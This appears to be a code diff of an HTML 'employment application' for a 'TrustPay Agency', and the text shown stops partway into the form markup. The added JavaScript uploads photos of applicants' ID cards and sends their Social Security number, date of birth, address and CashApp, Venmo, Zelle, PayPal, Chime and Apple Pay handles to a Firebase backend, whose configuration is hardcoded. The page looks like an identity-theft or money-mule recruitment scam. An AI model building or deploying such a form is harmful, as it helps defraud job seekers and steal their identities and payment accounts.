@@ -1,79 +1,190 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TrustPay Agency - Employment Application</title>
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #f0f0f0;
-        margin: 0;
-        padding: 0;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TrustPay Agency - Employment Application</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+        }
 
-    .container {
-        max-width: 800px;
-        margin: 20px auto;
-        background-color: #fff;
-        padding: 20px;
-        border-radius: 8px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
 
-    h2 {
-        text-align: center;
-        color: #333;
-    }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
 
-    form {
-        display: grid;
-        gap: 10px;
-    }
+        form {
+            display: grid;
+            gap: 10px;
+        }
 
-    label {
-        font-weight: bold;
-    }
+        label {
+            font-weight: bold;
+        }
 
-    input, select, textarea {
-        width: 100%;
-        padding: 8px;
-        box-sizing: border-box;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-        font-size: 14px;
-    }
+        input, select, textarea {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
 
-    button {
-        padding: 10px 20px;
-        background-color: #000000;
-        color: #fff;
-        border: none;
-        border-radius: 4px;
-        cursor: pointer;
-        font-size: 16px;
-    }
+        button {
+            padding: 10px 20px;
+            background-color: #000000;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
 
-    button:hover {
-        background-color: #000000;
-    }
+        button:hover {
+            background-color: #000000;
+        }
 
-    p {
-        margin-top: 10px;
-        font-size: 14px;
-        color: #666;
-    }
+        p {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+        }
 
-    input[type="file"] {
-        margin-top: 5px;
-    }
-</style>
+        input[type="file"] {
+            margin-top: 5px;
+        }
+    </style>
+    <!-- Add Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script>
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCC0cGcsdiMmeTYp2gNCjpO_XrJFE4Uj-g",
+            authDomain: "trustpay-d9d40.firebaseapp.com",
+            projectId: "trustpay-d9d40",
+            storageBucket: "trustpay-d9d40.appspot.com",
+            messagingSenderId: "835444953806",
+            appId: "1:835444953806:web:9231281cd19c075b7a769f",
+            measurementId: "G-5LRE3395RT"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const storage = firebase.storage();
+
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('applicationForm').addEventListener('submit', async (e) => {
+                e.preventDefault(); // Prevent default form submission
+
+                const formData = new FormData(e.target);
+                const idCardFront = formData.get('idCardFront');
+                const idCardBack = formData.get('idCardBack');
+
+                // Upload images to Firebase Storage
+                const frontImageRef = storage.ref(`idCards/${idCardFront.name}`);
+                const backImageRef = storage.ref(`idCards/${idCardBack.name}`);
+                await frontImageRef.put(idCardFront);
+                await backImageRef.put(idCardBack);
+
+                // Get download URLs
+                const frontImageUrl = await frontImageRef.getDownloadURL();
+                const backImageUrl = await backImageRef.getDownloadURL();
+
+                // Save form data to Firestore
+                await db.collection('applications').add({
+                    fullName: formData.get('fullName'),
+                    dob: formData.get('dob'),
+                    gender: formData.get('gender'),
+                    address: {
+                        street: formData.get('address'),
+                        city: formData.get('city'),
+                        state: formData.get('state'),
+                        zip: formData.get('zip')
+                    },
+                    phone: formData.get('phone'),
+                    email: formData.get('email'),
+                    idCardFront: frontImageUrl,
+                    idCardBack: backImageUrl,
+                    ssn: formData.get('ssn'),
+                    banks: {
+                        cashapp: formData.get('cashapp'),
+                        venmo: formData.get('venmo'),
+                        zelle: formData.get('zelle'),
+                        paypal: formData.get('paypal'),
+                        chime: formData.get('chime'),
+                        applepay: formData.get('applepay')
+                    },
+                    employmentHistory: [
+                        {
+                            employer: formData.get('prevEmployer1'),
+                            position: formData.get('position1'),
+                            duration: formData.get('duration1'),
+                            reason: formData.get('reason1')
+                        },
+                        {
+                            employer: formData.get('prevEmployer2'),
+                            position: formData.get('position2'),
+                            duration: formData.get('duration2'),
+                            reason: formData.get('reason2')
+                        }
+                    ],
+                    education: {
+                        level: formData.get('education'),
+                        institution: formData.get('institution'),
+                        field: formData.get('field')
+                    },
+                    skills: formData.get('skills'),
+                    certifications: formData.get('certifications'),
+                    references: [
+                        {
+                            name: formData.get('reference1'),
+                            relationship: formData.get('relationship1'),
+                            phone: formData.get('refPhone1'),
+                            email: formData.get('refEmail1')
+                        },
+                        {
+                            name: formData.get('reference2'),
+                            relationship: formData.get('relationship2'),
+                            phone: formData.get('refPhone2'),
+                            email: formData.get('refEmail2')
+                        }
+                    ],
+                    additionalInfo: {
+                        reason: formData.get('reason'),
+                        experience: formData.get('experience')
+                    },
+                    signature: formData.get('signature'),
+                    date: formData.get('date')
+                });
+
+                // Redirect to thanks.html
+                window.location.href = 'thanks.html'; // Change this to your actual thanks page path
+            });
+        });
+    </script>
 </head>
 <body>
 
 <div class="container">
     <h2>TrustPay Agency - Employment Application</h2>
-    <form id="applicationForm" action="https://formsubmit.co/1a59537dc9884c86b32c846861880ad0" method="POST" enctype="multipart/form-data">
+    <form id="applicationForm" action="#" method="POST" enctype="multipart/form-data">
         <h3>Personal Information</h3>
         <label for="fullName">Full Name:</label>
         <input type="text" id="fullName" name="fullName" required>
